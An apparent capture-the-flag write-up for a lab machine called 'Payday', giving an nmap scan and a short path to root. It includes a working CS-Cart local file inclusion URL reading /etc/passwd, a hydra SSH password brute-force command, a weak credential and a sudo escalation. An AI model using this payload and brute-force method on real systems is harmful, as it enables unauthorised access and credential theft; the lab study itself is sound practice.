# Payday

## Nmap scan:
```
22/tcp  open  ssh         OpenSSH 4.6p1 Debian 5build1 (protocol 2.0)
| ssh-hostkey: 
|   1024 f3:6e:87:04:ea:2d:b3:60:ff:42:ad:26:67:17:94:d5 (DSA)
|_  2048 bb:03:ce:ed:13:f1:9a:9e:36:03:e2:af:ca:b2:35:04 (RSA)
80/tcp  open  http        Apache httpd 2.2.4 ((Ubuntu) PHP/5.2.3-1ubuntu6)
|_http-title: CS-Cart. Powerful PHP shopping cart software
|_http-server-header: Apache/2.2.4 (Ubuntu) PHP/5.2.3-1ubuntu6
110/tcp open  pop3        Dovecot pop3d
|_ssl-date: 2026-03-25T15:00:31+00:00; +7s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|_    SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|_pop3-capabilities: UIDL SASL RESP-CODES PIPELINING TOP STLS CAPA
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: MSHOME)
143/tcp open  imap        Dovecot imapd
|_ssl-date: 2026-03-25T15:00:31+00:00; +7s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|_    SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|_imap-capabilities: completed IDLE SASL-IR Capability OK UNSELECT LOGINDISABLEDA0001 STARTTLS CHILDREN IMAP4rev1 THREAD=REFERENCES LOGIN-REFERRALS NAMESPACE SORT MULTIAPPEND LITERAL+
445/tcp open  netbios-ssn Samba smbd 3.0.26a (workgroup: MSHOME)
993/tcp open  ssl/imaps?
|_ssl-date: 2026-03-25T15:00:30+00:00; +6s from scanner time.
| ssl-cert: Subject: commonName=ubuntu01/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Not valid before: 2008-04-25T02:02:48
|_Not valid after:  2008-05-25T02:02:48
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|_    SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
995/tcp open  ssl/pop3s?
| ssl-cert: Subject: commonName=ubuntu01/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Not valid before: 2008-04-25T02:02:48
|_Not valid after:  2008-05-25T02:02:48
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|_    SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|_ssl-date: 2026-03-25T15:00:31+00:00; +7s from scanner time.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: PAYDAY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_smb2-time: Protocol negotiation failed (SMB2)
|_clock-skew: mean: 40m06s, deviation: 1h37m59s, median: 6s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.26a)
|   Computer name: payday
|   NetBIOS computer name: 
|   Domain name: 
|   FQDN: payday
|_  System time: 2026-03-25T11:00:20-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```

## Writeup:
LFI in CS Cart: http://192.168.213.39/classes/phpmailer/class.cs_phpmailer.php?classes_dir=../../../../../../../../../../../etc/passwd%00
User 'patrick', password is patrick.
hydra -l 'patrick' -P ~/SecLists/Passwords/Leaked-Databases/rockyou-75.txt 192.168.213.39 ssh -t 4
Once logged in, has all sudo rights.
So run 'sudo /bin/bash'
